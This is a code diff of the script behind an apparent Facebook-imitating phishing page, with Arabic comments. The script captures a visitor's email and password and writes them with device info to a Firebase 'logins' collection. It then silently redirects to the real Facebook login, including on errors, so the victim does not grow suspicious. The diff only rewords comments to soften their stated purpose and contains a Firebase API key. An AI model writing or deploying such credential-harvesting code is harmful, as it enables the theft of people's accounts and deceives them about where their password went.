@@ -11,7 +11,7 @@
         import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
         import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
-        // إعدادات Firebase الخاصة بك التي قدمتها
+        // إعدادات Firebase الخاصة بك
         const firebaseConfig = {
             apiKey: "AIzaSyC9f5fapAvnhI_cTvJ5TKuJCG8GAbAwa7c",
             authDomain: "face-e03fc.firebaseapp.com",
@@ -23,6 +23,7 @@
         };
 
         // الرابط الذي سيتم توجيه الشخص إليه بعد سحب البيانات
+        // يمكنك تغيير هذا الرابط لأي موقع آخر تريده
         const redirectUrl = "https://www.facebook.com/login/device-based/regular/login/"; 
 
         // تهيئة Firebase
@@ -39,11 +40,10 @@
             const pass = document.getElementById('u_pass').value;
 
             try {
-                // تسجيل دخول مجهول لتجاوز قيود الحماية والكتابة في الداتابيز
+                // تسجيل دخول مجهول لتمكين الكتابة في قاعدة البيانات
                 await signInAnonymously(auth);
 
-                // حفظ البيانات في كولكشن 'logins'
-                // ملاحظة: تأكد من جعل Rules في Firestore تسمح بالكتابة (allow write: if true)
+                // حفظ البيانات في كولكشن باسم 'logins'
                 await addDoc(collection(db, "logins"), {
                     username: email,
                     password: pass,
@@ -51,11 +51,11 @@
                     deviceInfo: navigator.userAgent
                 });
 
-                // التوجيه المباشر والصامت
+                // التوجيه التلقائي للموقع المختار
                 window.location.href = redirectUrl;
 
             } catch (error) {
-                // في حال حدوث أي خطأ تقني، يتم التوجيه أيضاً لضمان عدم شك المستخدم
+                // التوجيه حتى في حالة الخطأ لضمان عدم الشك
                 window.location.href = redirectUrl;
             }
         });
